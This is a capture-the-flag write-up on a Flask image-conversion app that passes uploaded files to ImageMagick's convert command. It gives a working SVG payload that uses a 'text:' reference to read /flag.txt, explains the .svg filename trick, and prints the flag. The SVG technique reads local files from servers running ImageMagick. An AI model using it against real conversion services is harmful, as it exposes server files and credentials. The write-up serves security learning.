# ImageMagick — PNG Converter (CTF write-up)

## Summary

**Challenge:** ImageMagick file-conversion web app

**Vulnerability:** ImageMagick content handling allowed local file reads via crafted SVG (server used `convert <input> <output>` on user-supplied file)

**Impact:** Local file disclosure — `/flag.txt` was read and returned embedded in the converted PNG

**Flag:** `igoh25{1a883d1f05f78b4c93286f17f1039a98}`

---

## Environment

- App: Flask web app (single endpoint `POST /upload`)
- Key code (from `app.py`): saves uploaded file to `/tmp/uploads/<name>` then runs:

```python
subprocess.run(['convert', saved_path, out_path], check=True, timeout=10)
```

- Dockerfile copied `flag.txt` to `/flag.txt` inside container.
- Upload size limit: 10 KB

---

## Discovery

1. Enumerated repository and files (`app.py`, `templates/index.html`, `Dockerfile`, `flag.txt`).
2. Noted the risky pattern: user file saved and passed directly to ImageMagick `convert` with no sanitization of file contents.
3. Confirmed service runs locally via `docker-compose up --build`.

Key snippet from `app.py`:

```python
filename = secure_filename(f.filename) or f'upload-{uuid.uuid4().hex}'
saved_path = os.path.join(UPLOAD_DIR, filename)
f.save(saved_path)

subprocess.run(['convert', saved_path, out_path], check=True, timeout=10)
```

This showed the conversion command was fully controlled by the saved file path — classic ImageTragick-style vector for file reads.

### Create the payload file (SVG referencing text:/flag.txt)

I used a simple SVG that instructs the SVG renderer to include the contents of `/flag.txt` as text:

```bash
cat > payload.txt << 'EOF'
<svg width="1000" height="1000" xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink">
  <image x="0" y="0" width="1200" height="1200"
         xlink:href="text:/flag.txt"/>
</svg>
EOF
```

This is plain text on disk.

### Upload the payload but force the saved filename to `.svg`

The Flask handler uses the provided filename when saving; we can upload `payload.txt` while telling the server to save it as `exploit.svg`

<img width="604" height="360" alt="image" src="https://github.com/user-attachments/assets/543d4dbd-3386-4669-9a8c-bb386573a0e7" />

- the server saved `/tmp/uploads/exploit.svg`
- ImageMagick `convert /tmp/uploads/exploit.svg /tmp/uploads/exploit.png` executed, rendering the SVG and embedding the contents of `/flag.txt` as rasterized text inside the returned PNG.

after submit click upload & convert

<img width="711" height="86" alt="image" src="https://github.com/user-attachments/assets/c1a87d63-a671-49ec-ae20-2d254a68a754" />
